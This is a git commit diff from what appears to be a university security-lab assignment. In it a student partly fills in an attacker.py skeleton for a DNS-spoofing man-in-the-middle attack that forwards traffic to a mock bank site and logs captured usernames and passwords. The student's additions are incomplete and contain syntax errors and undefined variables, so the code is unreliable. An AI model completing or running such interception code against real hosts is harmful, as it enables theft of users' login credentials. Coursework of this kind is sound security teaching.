1ab6996a046ee4e75d004cf710a3d9d1e374ceab
DavidElone <david-elone@campus.technion.ac.il>
2022-05-16 19:00:44 +0300

    First change in my computer

--- attacker/attacker.py
+++ attacker/attacker.py
@@ -6,7 +6,11 @@ from scapy.all import *
 conf.L3socket = L3RawSocket
 WEB_PORT = 8000
 HOSTNAME = "LetumiBank.com"
+HOST=''
 
+# 127.0.0.1 Client
+# 127.0.0.3 Attaquer
+# 127.1.1.1 Real Host
 
 def resolve_hostname(hostname):
 	# IP address of HOSTNAME. Used to forward tcp connection.
@@ -24,6 +28,8 @@ def log_credentials(username, password):
 def check_credentials(client_data):
 	# TODO: Take a block of client data and search for username/password credentials.
 	# If found, log the credentials to the system by calling log_credentials().
+	username =
+	log_credentials(username,password)
 	raise NotImplementedError
 
 
@@ -35,6 +41,20 @@ def handle_tcp_forwarding(client_socket, client_ip, hostname):
 
 		# TODO: accept a new connection from the client on client_socket and
 		# create a new socket to connect to the actual host associated with hostname.
+		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+			s.bind(resolve_hostname(hostname),WEB_PORT)
+			s.listen()
+			conn, addr = s.accept()
+			with conn:
+				print(f"Connected by {addr}")
+				while True:
+					data = conn.recv(1024)
+					with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as ss:
+						ss.connect((HOSTNAME, WEB_PORT))
+						ss.sendall(data)
+						check_credentials(data)
+					if not data:
+						break
 
 		# TODO: read data from client socket, check for credentials, and forward along to host socket.
 		# Check for POST to '/post_logout' and exit after that request has completed.
@@ -42,18 +62,32 @@ def handle_tcp_forwarding(client_socket, client_ip, hostname):
 		raise NotImplementedError
 
 
-def dns_callback(packet, extra_args):
+def dns_callback(packet, extra_args): # Check if packet
 	# TODO: Write callback function for handling DNS packets.
 	# Sends a spoofed DNS response for a query to HOSTNAME and calls handle_tcp_forwarding() after successful spoof.
+	handle_tcp_forwarding(client_socket, client_ip, hostname)
 	raise NotImplementedError
 
 
 def sniff_and_spoof(source_ip):
 	# TODO: Open a socket and bind it to the attacker's IP and WEB_PORT.
 	# This socket will be used to accept connections from victimized clients.
-
+	with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+		s.bind(resolve_hostname(hostname), WEB_PORT)
+		s.listen()
+		conn, addr = s.accept()
+		with conn:
+			print(f"Connected by {addr}")
+			while True:
+				data = conn.recv(1024)
+				if not data:
+					break
 	# TODO: sniff for DNS packets on the network. Make sure to pass source_ip
-	# and the socket you created as extra callback arguments. 
+	# and the socket you created as extra callback arguments.
+
+	scapy.sniff(filter="tcp and port 53", count=5)
+
+
 	raise NotImplementedError
 
 
